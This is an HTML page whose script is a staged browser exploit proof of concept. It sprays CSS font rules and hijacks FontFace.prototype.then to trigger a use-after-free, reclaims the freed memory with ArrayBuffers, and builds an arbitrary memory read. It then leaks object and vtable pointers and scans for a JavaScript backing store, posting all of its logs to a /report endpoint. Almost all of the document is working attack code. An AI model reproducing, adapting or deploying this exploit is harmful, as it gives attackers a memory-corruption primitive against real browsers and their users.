<!doctype html><html><head><meta charset="utf-8"><title>CSF ALL-IN-ONE</title>
<style>body{margin:0;padding:14px;background:#07090d;color:#cfe3ff;font-family:system-ui}
#o{white-space:pre-wrap;font:12px/1.4 ui-monospace,monospace;color:#9fb4d6}
#s{font-size:30px;font-weight:700;color:#7fd6a8}</style></head>
<body><div id="s">CSF ALL</div><pre id="o"></pre><script>
var out=document.getElementById("o"),LOG=[];
function send(){fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:LOG})}).catch(function(){});}
function log(s){out.textContent+=s+"\n";LOG.push(s);try{send();}catch(e){}}
var SZ=0xb8, OFF_FS=0x28, OFF_FS_SZ=0x30, OFF_FS_CAP=0x34, OFF_ST=0x7a;
function hx(lo,hi){return "0x"+("00000000"+(hi>>>0).toString(16)).slice(-8)+("00000000"+(lo>>>0).toString(16)).slice(-8);}
function plausible(lo,hi){return hi<=0xffff && (lo%8)===0 && (hi!==0||lo>=0x10000);}
function add64(lo,hi,d){var l=(lo>>>0)+d,h=(hi>>>0)+((l>0xffffffff)?1:0);return {lo:l>>>0,hi:h>>>0};}

// ---- stage 1: capability probe ----
function stageCaps(){
  var n=navigator;
  log("[1] caps: usb="+(n.usb?"YES":"no")+" serial="+(n.serial?"YES":"no")+" bt="+(n.bluetooth?"YES":"no")+
      " hid="+(n.hid?"YES":"no")+" storage="+(n.storage?"YES":"no")+
      " wasm="+(typeof WebAssembly)+" sab="+(typeof SharedArrayBuffer)+" bigint="+(typeof BigInt)+
      " crypto.subtle="+(n.crypto&&n.crypto.subtle?"YES":"no")+" idb="+(typeof indexedDB)+" worker="+(typeof Worker));
}

// ---- stage 2..4: UAF + reclaim + read ----
async function stageUAF(){
  var SPRAY=0xb0, abs=[], uaf_font=null, uaf_ab=null;
  var spray_rule="@font-face{font-family:spray;src:local(systemfont);unicode-range:U+0043;}";
  var uaf_rule="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042;}";
  var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
  document.fonts.add(A); void A.loaded;
  var style=document.createElement("style"); document.head.append(style);
  for(var i=0;i<SPRAY/4;i++) style.sheet.insertRule(spray_rule, style.sheet.cssRules.length);
  var uaf_idx=style.sheet.cssRules.length;
  style.sheet.insertRule(uaf_rule, style.sheet.cssRules.length);
  for(var i=SPRAY/4;i<SPRAY;i++) style.sheet.insertRule(spray_rule, style.sheet.cssRules.length);
  void document.body.offsetHeight;
  var old_then=FontFace.prototype.then, fired=false;
  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
    if(this!==A) return undefined;
    fired=true; log("[2] UAF window: getter(A) fired");
    style.sheet.deleteRule(uaf_idx); void document.body.offsetHeight;
    for(var i=style.sheet.cssRules.length-1;i>=0;i--){ if(style.sheet.cssRules[i].cssText.indexOf("spray")!==-1) style.sheet.deleteRule(i); }
    void document.body.offsetHeight;
    for(var i=0;i<SPRAY;i++){ var ab=new ArrayBuffer(SZ); var dv=new DataView(ab); dv.setUint32(8,1,true); dv.setUint8(OFF_ST,3); abs.push(ab); }
    return undefined;}});
  var fonts=null; try{ fonts=await document.fonts.load("1em a, b","AB"); }catch(e){ log("[2] load threw: "+e.message); }
  Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:old_then});
  if(!fonts||fonts.length!==2){ log("[2] no UAF (fonts="+(fonts?fonts.length:"null")+")"); return null; }
  for(var i=0;i<fonts.length;i++){ if(fonts[i].unicodeRange==="U+0-10FFFF"){ uaf_font=fonts[i]; break; } }
  for(var i=0;i<abs.length;i++){ var dv=new DataView(abs[i]); if(dv.getUint32(8,true)===2){ uaf_ab=abs[i]; break; } }
  log("[3] UAF font="+(uaf_font?"FOUND":"none")+"  reclaimed AB="+(uaf_ab?"FOUND ref2":"none"));
  if(!uaf_font||!uaf_ab) return null;
  function setPtr(dv,off,lo,hi){ dv.setUint32(off,lo>>>0,true); dv.setUint32(off+4,hi>>>0,true); }
  function read(lo,hi,size){
    var ab=new ArrayBuffer(size), u8=new Uint8Array(ab), dv=new DataView(uaf_ab), o=0;
    while(o<size){
      setPtr(dv,OFF_FS,(lo+o)>>>0,hi);
      dv.setInt32(OFF_FS_SZ,1,true);
      dv.setInt32(OFF_FS_CAP,1,true);
      var s=uaf_font.featureSettings;
      for(var i=1;i<5 && o<size;i++) u8[o++]=s.charCodeAt(i)&0xff;
    }
    return ab;
  }
  return {font:uaf_font, ab:uaf_ab, read:read};
}

// ---- stage 5: leak ----
function stageLeak(r){
  var dv=new DataView(r.ab);
  var wrap={lo:dv.getUint32(0x60,true),hi:dv.getUint32(0x64,true)};
  log("[4] m_wrapper="+hx(wrap.lo,wrap.hi));
  var w=new Uint8Array(r.read(wrap.lo,wrap.hi,32));
  var target={lo:(w[8]|w[9]<<8|w[10]<<16|w[11]<<24)>>>0, hi:(w[12]|w[13]<<8|w[14]<<16|w[15]<<24)>>>0};
  log("[5] WeakPtr target="+hx(target.lo,target.hi));
  if(!plausible(target.lo,target.hi)){ log("[5] implausible"); return null; }
  var v=new Uint8Array(r.read(target.lo,target.hi,16));
  var vp={lo:(v[0]|v[1]<<8|v[2]<<16|v[3]<<24)>>>0,hi:(v[4]|v[5]<<8|v[6]<<16|v[7]<<24)>>>0};
  log("[6] vptr="+hx(vp.lo,vp.hi)+"  (PAC-signed; strip top16 = "+hx(vp.lo,(vp.hi&0xffff))+")");
  return target;
}

// ---- stage 6: JS object scan ----
function stageScan(r,target){
  var victim=new Uint32Array(8); victim[0]=0x41414141; victim[1]=0x42424242; victim[2]=0x43434343;
  log("[7] victim Uint32Array(8) markers planted");
  var base={lo:target.lo & 0xfffff000, hi:target.hi};
  var found=null;
  for(var off=0; off<0x3000 && !found; off+=0x100){
    var a=add64(base.lo,base.hi,off), b;
    try{ b=new Uint8Array(r.read(a.lo,a.hi,0x100)); }catch(e){ continue; }
    for(var i=0;i+12<=b.length;i+=4){
      if(b[i]===0x41&&b[i+4]===0x42&&b[i+8]===0x43){ found=add64(a.lo,a.hi,i); break; }
    }
  }
  log(found?("[8] MARKER FOUND at "+hx(found.lo,found.hi)+"  <== JS backing store"):"[8] marker not found in window");
  return found;
}

(async function(){
  log("ALL-IN-ONE  UA: "+navigator.userAgent);
  stageCaps();
  var r=await stageUAF(); if(!r){ log("END: no primitive"); log("done"); return; }
  var t=stageLeak(r);
  if(t) stageScan(r,t);
  log("done");
})();
</script></body></html>
